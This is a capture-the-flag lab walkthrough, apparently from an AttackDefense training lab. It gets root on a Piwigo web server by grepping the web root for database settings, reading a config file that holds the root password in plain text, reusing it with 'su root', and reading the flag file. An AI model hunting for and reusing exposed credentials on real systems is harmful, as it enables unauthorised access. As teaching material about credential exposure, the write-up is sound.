# Web server

Use `grep` to search recursively

`-n` - line numbers

`-r` - recursively through files

```
student@attackdefense:/var/www/html$ grep -nr "db_user"
admin/include/functions_upgrade.php:322:    $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'], $conf['db_password'], $conf['db_base']);
upgrade_feed.php:63:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
i.php:412:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
include/common.inc.php:115:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
install.php:270:$conf[\'db_user\'] = \''.$dbuser.'\';
local/config/database.inc.php:4:$conf['db_user'] = 'root';
```

Open the file with password exposed

```
student@attackdefense:/var/www/html$ cat ./local/config/database.inc.php
<?php
$conf['dblayer'] = 'mysql';
$conf['db_base'] = 'piwigo';
$conf['db_user'] = 'root';
$conf['db_password'] = 'w3lc0m3t0adlabs';
$conf['db_host'] = 'localhost';

$prefixeTable = 'piwigo_';

define('PHPWG_INSTALLED', true);
define('PWG_CHARSET', 'utf-8');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
?>student@attackdefense:/var/www/html$
```

Use the password to log in as root
```
student@attackdefense:/var/www/html$ su root
Password:
root@attackdefense:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Find flag
```
root@attackdefense:/var/www/html# find / -name *flag* 2>/dev/null
...
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/var/www/html/plugins/language_switch/flags.tpl
/root/flag
root@attackdefense:/var/www/html# cat /root/flag
760a582ebd219e2efb6dec173d416723
```

